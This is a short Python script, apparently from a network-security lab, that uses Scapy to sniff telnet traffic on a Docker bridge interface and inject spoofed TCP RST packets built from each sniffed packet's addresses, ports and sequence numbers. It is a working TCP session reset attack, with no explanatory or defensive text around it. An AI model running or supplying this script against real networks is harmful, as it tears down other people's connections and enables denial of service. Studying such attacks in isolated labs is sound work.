#!/usr/bin/env python3
from scapy.all import *

def send_rst_pckt(packet):
  src_ip = packet[IP].src
  dst_ip = packet[IP].dst
  src_port = packet[TCP].sport
  dst_port = packet[TCP].dport
  ack_num = packet[TCP].ack
  seq_num = packet[TCP].seq
  ip = IP(src=src_ip, dst=dst_ip)
  tcp = TCP(sport=src_port, dport=dst_port, flags="R", seq=seq_num, ack=ack_num)
  pkt = ip/tcp
  ls(pkt)
  send(pkt,verbose=0)

sniff(filter="tcp and dst port 23", iface="br-7a6748c1697c", prn=send_rst_pckt)

